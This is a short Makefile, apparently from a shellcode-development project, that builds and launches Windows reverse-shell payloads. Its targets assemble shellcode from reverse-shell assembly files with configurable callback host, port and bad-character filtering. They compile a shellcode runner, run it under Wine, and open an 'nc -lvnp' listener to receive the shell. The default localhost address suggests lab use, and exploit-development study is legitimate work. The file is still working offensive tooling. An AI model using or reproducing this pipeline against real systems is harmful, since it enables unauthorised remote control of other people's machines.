LHOST    ?= 127.0.0.1
LPORT    ?= 443
PAYLOAD  ?= payloads/revshell_url.asm
BADCHARS ?=
MAX_SIZE ?=

CC      := i686-w64-mingw32-gcc
WINE    := WINEARCH=win32 WINEPREFIX=$(HOME)/.wine32 wine

.PHONY: all assemble run listen clean test

all: runner.exe

assemble:
	python3 assembler.py $(PAYLOAD) \
		$(if $(LHOST),-i $(LHOST)) \
		$(if $(LPORT),-p $(LPORT)) \
		$(if $(BADCHARS),-b "$(BADCHARS)") \
		$(if $(MAX_SIZE),-m $(MAX_SIZE))

shellcode.h: $(PAYLOAD) assembler.py
	python3 assembler.py $(PAYLOAD) -i $(LHOST) -p $(LPORT) --cheader $@

runner.exe: runner.c shellcode.h
	$(CC) -o $@ runner.c -lws2_32 -mwindows

run: runner.exe
	$(WINE) runner.exe

# Start a listener and execute the runner under Wine in one shot.
# Usage: make test LHOST=<ip> LPORT=<port> PAYLOAD=payloads/revshell_strcpy.asm
test: runner.exe
	nc -lvnp $(LPORT) & sleep 1 && $(WINE) runner.exe 2>/dev/null; wait

listen:
	nc -lvnp $(LPORT)

clean:
	rm -f runner.exe shellcode.h
